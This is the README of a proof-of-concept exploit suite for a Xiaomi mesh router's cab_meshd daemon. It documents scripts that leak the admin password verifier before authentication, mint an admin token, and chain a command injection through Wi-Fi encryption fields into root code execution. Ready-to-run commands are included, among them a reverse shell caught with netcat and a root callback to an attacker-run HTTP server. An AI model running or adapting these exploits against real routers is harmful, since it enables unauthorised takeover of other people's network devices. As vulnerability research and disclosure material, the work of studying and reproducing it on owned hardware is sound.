# Proof-of-concept scripts

Pure Python 3 (stdlib only); no external packages. (A couple of helpers shell out to
`ip` to detect the attacker's local MAC/IP for the login nonce, with a hard-coded
fallback if it is absent.) Each script documents its mechanics in its module
docstring; the `cab_meshd` internals are in
[`../technical-appendix.md`](../technical-appendix.md).

> Run only against a device you own. The PoCs default to `192.168.31.1`; override
> with `--host`. All connect to the slow `cab_meshd` daemon, so they default to a
> 20 s timeout and retry the handshake through the daemon's connection-slot stall.

| Script | For | What it does |
|---|---|---|
| `init_router.py` | prep | Minimally initializes a *factory* unit through `router_init`, sets `INITTED=YES`, and opens the CAP listener after reboot while leaving `NETMODE` unset. This differs from the normal web wizard, which can set `whc_cap`. It retains the factory admin verifier. |
| `extract_admin.py` | **V1** | **The primary PoC.** Leak `web_passwd256` over 19553 (pre-auth), then mint an admin `stok`. **Read-only** against the target (never sends `type-7`). Confirmed on hardware. |
| `ota_rce.py` | **V1+V2** | **Root RCE in the tested gate-open mode.** Chains V1 → V2 via `encryption`-field injection and a root callback. Stops before planting unless `get_netmode` confirms numeric `0`. **Confirmed on hardware after minimal initialization.** |
| `handshake.py` | inspection | Full mesh protocol driver: forges the constant-key handshake to `ST_RUNNING` and prints the CAP's sync config (where `web_passwd256` appears). `--no-trigger` stops before `cap_init`. |
| `rce_poc.py` | **V2** | **Root command execution (CAP/LAN direct path).** base64'd `--cmd` in the type-4 **plant** (`body[0x90]`), full `4→5→7` handshake. Confirmed in emulation (root-owned file). ~4-char one-shot. Used as the trigger component of `ota_rce.py`. See `../chain2-root-rce.md`. |
| `exploit.py` | V2 (explanatory) | Documents the primitive verbosely, but its `body+0xe6` field theory does **not** hold on the CAP server path — **use `rce_poc.py`** for a landing payload. |

## Primary run (device you own)

The V2 hardware test used the gate-open mode left by `init_router.py`. On an
ordinarily web-configured unit, `NETMODE=whc_cap` can block the demonstrated
CAP root path even though V1 admin takeover still works. A full reset erases
settings; repeating the normal web wizard can set the same mode again. See
[`../CORRECTIONS.md`](../CORRECTIONS.md).

```bash
# only if the unit is at factory defaults (19553 closed):
python3 init_router.py --host 192.168.31.1 --reboot

# V1 — non-destructive admin takeover:
python3 extract_admin.py --host 192.168.31.1
#   -> leaks web_passwd256 and prints a valid admin stok

# inspection — dump the sync config that leaks the verifier:
python3 handshake.py --host 192.168.31.1 --no-trigger
```

Minimal initialization keeps the shipped admin verifier and opens the mesh
listener. Use an isolated network and complete the intended test or install
promptly; ordinary web setup is a different path and can close the V2 gate.

## V2 OTA — root RCE in the gate-open state (confirmed on hardware)

```bash
# Terminal 1 — run the PoC (starts its own HTTP server on port 8000):
python3 ota_rce.py --host 192.168.31.1 --attacker 192.168.31.231

# Terminal 2 — catch the reverse shell:
nc -l -p 4444
```

`ota_rce.py` automates the full chain:
1. **V1** — leaks `web_passwd256`, mints admin `stok` (pre-auth, over Wi-Fi)
2. **Plant** — writes injection payloads into Wi-Fi `encryption` UCI keys via
   `set_wifi_without_restart`; preserves the original SSID
3. **Trigger** — fires `cap_init` via the `type-4→5→7` handshake
4. **Catch** — waits for the root callback (`/pwned?uid=0_user=root`) and the
   self-repair confirmation; the reverse shell connects to `nc` on port 4444

Be precise about what the self-repair does, because it changes your AP: `cap_init`
reconfigures the radios from the poisoned `encryption` values, and the payload then
overwrites any interface still holding the injected value with
**`encryption=psk2`, `key=meshpoc12345`**. So after a successful run the AP is
**WPA2 with that fixed password**, whatever it was before — including a unit that
started out open. Reconnect with:

```bash
nmcli dev wifi connect <ssid> password meshpoc12345
```

If you joined the **open** factory AP earlier in the run, the saved open profile for
that SSID shadows the new WPA2 one and `nmcli` fails with
`802-11-wireless-security.key-mgmt: property is missing`. Forget that profile first,
then retry. The reverse shell loop retries every 10 seconds, so if the `nc` listener
disconnects, starting a new one picks up a fresh shell.

This root chain was confirmed over Wi-Fi on physical RD03v2 hardware after
minimal initialization left `NETMODE` unset. Reachability after ordinary
Xiaomi web setup has not been demonstrated. See `../chain2-root-rce.md` for the
technical breakdown.

## V2 — direct root command execution (CAP/LAN path, emulation)

```bash
python3 rce_poc.py --host 192.168.31.1 --cmd '>W'   # creates root-owned /W; ~4-char budget
```

Delivers `base64('`>W`')` in the type-4 plant, completes `4→5→7`, and the daemon
drives `mimesh_init`'s `eval` as root when the CAP gate is open. Confirmed in
emulation. A completed `cap_init` can set `NETMODE=whc_cap` and close that gate;
normal web setup can set the same mode without any exploit.
The payload budget is ~4 characters here. The RE/WAN candidate has a larger
budget but is not confirmed end-to-end on hardware; see `../chain2-root-rce.md`.
`ota_rce.py` uses the CAP handshake as its trigger and plants the longer payload
through the admin Wi-Fi API in the tested gate-open state.

## Safety / footprint
- `extract_admin.py` and `handshake.py --no-trigger` change nothing on the device.
- `ota_rce.py` modifies the device's Wi-Fi encryption UCI keys and triggers
  `cap_init`; the self-repairing payload restores valid encryption afterward, but the
  trigger can change `NETMODE` and Wi-Fi state.
- **If the CAP mode is gated or cannot be confirmed, `ota_rce.py` stops before
  planting anything.** `NETMODE=whc_cap` blocks this sink but does not prove a
  previous exploit. On an owned test unit, a full reset followed by the minimal
  `init_router.py` setup can reproduce the tested gate-open state; a normal web
  setup can close it again.
- `rce_poc.py`/`exploit.py` send a `cap_init` trigger; on a gate-open unit that
  *could* execute the command if the sink fires, so choose the payload accordingly.
